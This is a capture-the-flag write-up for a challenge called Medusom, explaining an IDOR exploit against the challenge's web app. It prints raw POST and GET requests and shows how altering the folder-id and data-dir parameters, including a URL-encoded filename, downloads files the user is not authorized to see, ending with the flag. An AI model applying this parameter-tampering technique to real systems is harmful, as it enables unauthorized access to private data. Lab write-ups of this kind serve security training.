# Medusom [part 1] - Write up

I don't have screenshots for this challenge, (I'm sorry 😥) so I will try my best to explain it !

For this challenge, we need to attack a website to download some data that we are not authorized to see. <br>
To do that, we will exploit an IDOR (Insecure Direct Object Reference).

When we click on "download" for an authorized file, a POST request with several parameters is made :
- <strong>explorer</strong>
- <strong>file-download</strong> #boolean : we give it the value "true" for download a file
- <strong>folder-id</strong> #the id of the folder
- <strong>data-dir</strong> #the file we're interested in

```
POST /ajax/listing-post HTTP/1.1
Host: 141.94.222.142:57411
Content-Length: 95
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://141.94.222.142:57411
Referer: http://141.94.222.142:57411/post/mWeqC0lstvYVFQ5Xuy8igsxa
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: SESSID=a784e25bbdb1b4c8c680adfe5b374c761ab54bfe4b933512745d00dc3263a7c0
Connection: close

explorer=true&file-download=true&folder-id=1&data-dir=airbus%2FAIRBUS_INTELLIGENCE%2Fdetails.md
```

Just after that, a GET request is made with the same parameters :

```
GET /ajax/listing-post?file-download=true&folder-id=1&data-dir=airbus%2FAIRBUS_INTELLIGENCE%2Fdetails.md HTTP/1.1
Host: 141.94.222.142:57411
Referer: http://141.94.222.142:57411/post/mWeqC0lstvYVFQ5Xuy8igsxa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: SESSID=a784e25bbdb1b4c8c680adfe5b374c761ab54bfe4b933512745d00dc3263a7c0
Connection: close
```

To exploit the vulnerability, we just need to change the folder-id and the data-dir parameters to download the files of our choice 😀

<br>

The files that we want to download are in the folder id 11 and their names are :
<strong>
- flag.txt
- NOTES.txt
- map.png
- NOTES.txt
- RECAP.pdf
- requests
- Skiblili.odt
- code.zip
- ._lock.Skiblili.odt#
</strong>


We are going to download them one by one, by modifying the value of the folder-id parameter by <em>11</em> and the value of the data-dir parameter by the different filenames that I wrote.

So for the requests, we will have something like that for all the files we want :

```
POST :

POST /ajax/listing-post HTTP/1.1
Host: 141.94.222.142:57411
Content-Length: 95
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://141.94.222.142:57411
Referer: http://141.94.222.142:57411/post/O7PO1YC3aWIFBijpFqM8pvAzEBgY0IKDuSp
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: SESSID=a784e25bbdb1b4c8c680adfe5b374c761ab54bfe4b933512745d00dc3263a7c0
Connection: close

explorer=true&file-download=true&folder-id=11&data-dir=PATH\TO\FILE.extension

GET :

GET /ajax/listing-post?file-download=true&folder-id=11&data-dir=PATH\TO\FILE.extension HTTP/1.1
Host: 141.94.222.142:57411
Referer: http://141.94.222.142:57411/post/O7PO1YC3aWIFBijpFqM8pvAzEBgY0IKDuSp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: SESSID=a784e25bbdb1b4c8c680adfe5b374c761ab54bfe4b933512745d00dc3263a7c0
Connection: close
```

There is however one subtility for the file <strong><em>._lock.Skiblili.odt#</em></strong> :<br>

Because of the <strong>#</strong> at the end of the filename, we first need to URL encode it :

![Sans titre](https://user-images.githubusercontent.com/66923124/164997569-897b07e5-400a-4e32-94ed-0c3cfcefa661.png)

<strong>So data-dir=%2e%5f%6c%6f%63%6b%2e%53%6b%69%62%6c%69%6c%69%2e%6f%64%74%23 for this file </strong>

<br>

After we downloaded all the files, we need to read them !

![files](https://user-images.githubusercontent.com/66923124/164997733-47d0c367-2178-48e8-a2b0-e68fcf607662.png)

<strong>flag.txt is a troll :</strong>

![Sans titre](https://user-images.githubusercontent.com/66923124/164997796-463f9c60-ab16-4ea8-97be-16ccb870b5a0.png)

<strong>NOTES.txt is the first part of the flag :</strong>

![Sans titre](https://user-images.githubusercontent.com/66923124/164997815-b8a93a20-385d-491a-83b6-af6ee43f7751.png)

<strong>RECAP.pdf is the second part of the flag :</strong>

![Sans titre](https://user-images.githubusercontent.com/66923124/164997851-8f7769aa-17f8-4882-8805-5f3340df89a4.png)

<strong>map.png is the third part of the flag :</strong>

![Sans titre](https://user-images.githubusercontent.com/66923124/164997888-f01220d6-857f-491a-98ef-68c60460747d.png)

<strong>In code.zip, there is a file named code.txt, which is the last part of the flag :</strong>

![Sans titre](https://user-images.githubusercontent.com/66923124/164997950-abce7f23-85d7-42f0-b2e5-722f40e6dd6f.png)


After we concatenate all the four strings we obtain the flag :

<strong> FLAG : MCTF{1D0R_f0r_th3_w1n} </strong>
